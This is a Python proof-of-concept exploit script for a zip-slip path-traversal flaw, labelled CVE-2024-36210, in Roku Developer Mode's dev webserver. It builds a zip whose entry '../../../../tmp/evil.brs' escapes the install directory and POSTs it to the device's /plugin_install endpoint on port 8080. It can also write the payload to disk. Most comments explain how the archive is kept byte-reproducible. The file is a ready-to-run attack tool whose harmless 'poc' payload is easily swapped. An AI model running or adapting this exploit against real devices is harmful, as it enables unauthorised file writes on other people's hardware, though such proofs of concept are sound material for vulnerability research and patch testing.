#!/usr/bin/env python3
"""CVE-2024-36210 — Roku Developer Mode. The dev webserver on :8080 accepts a
zip whose entry paths escape the install dir (zip-slip)."""
import io, sys, urllib.request, zipfile

# Fixed ZIP entry timestamp: writestr() stamps current time by default,
# which would make every build byte-different (manifest drift).
_EPOCH = (1980, 1, 1, 0, 0, 0)

def _writestr(z, name: str, data: bytes):
    info = zipfile.ZipInfo(name, date_time=_EPOCH)
    # Stored, not deflated: the deflate output depends on the zlib build
    # (classic zlib vs zlib-ng disagree byte-for-byte), so a compressed
    # archive hashes differently on CI than on a dev box and the payload
    # manifest drifts. ZIP_STORED keeps the bytes identical everywhere.
    info.compress_type = zipfile.ZIP_STORED
    # Pin the "version made by" host field: ZipInfo defaults it to 0 on
    # Windows and 3 on Unix, so the same build produced different bytes
    # per OS and the payload manifest drifted between CI and local.
    info.create_system = 0
    z.writestr(info, data)

def build() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        _writestr(z, "../../../../tmp/evil.brs", b"sub main()\n print \"poc\"\nend sub\n")
        _writestr(z, "manifest", b"title=PoC\nmajor_version=1\nminor_version=0\n")
    return buf.getvalue()

def exploit(host, port=8080):
    url = f"http://{host}:{port}/plugin_install"
    req = urllib.request.Request(url, data=build(),
                                 headers={"Content-Type": "application/zip"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"[+] CVE-2024-36210 {url} -> {r.status}")
            return True
    except Exception as e:
        print(f"[-] {e}"); return False

def main():
    if len(sys.argv) > 1: exploit(sys.argv[1])
    else:
        from pathlib import Path
        Path("cve-2024-36210.zip").write_bytes(build()); print("[+] payload written")

if __name__ == "__main__":
    main()
